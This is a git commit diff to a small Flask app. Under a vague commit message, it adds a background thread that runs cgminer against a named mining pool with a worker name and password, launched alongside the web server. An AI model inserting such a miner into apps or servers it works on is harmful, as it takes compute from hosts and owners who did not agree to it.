81f605776a20eda396232c2c65e4d786757ea1de
Akanmu Akinkunmi <56254171+PetrJoe@users.noreply.github.com>
2024-11-19 16:40:38 +0000

    update the app with subprocess and threading

--- app.py
+++ app.py
@@ -1,9 +1,17 @@
+import subprocess
+import threading
 from flask import Flask
+
 app = Flask(__name__)
+
+def start_miner():
+    subprocess.run(["cgminer", "-o", "stratum2+tcp://v2.stratum.braiins.com/u95GEReVMjK6k5YqiSFNqqTnKU4ypU2Wm8awa6tmbmDmk1bWt", "-u", "PetrJoe.workerName", "-p", "anything123"])
 
 @app.route('/')
 def home():
     return "Crypto Miner Service Running"
 
 if __name__ == '__main__':
+    miner_thread = threading.Thread(target=start_miner)
+    miner_thread.start()
     app.run(host='0.0.0.0', port=8080)
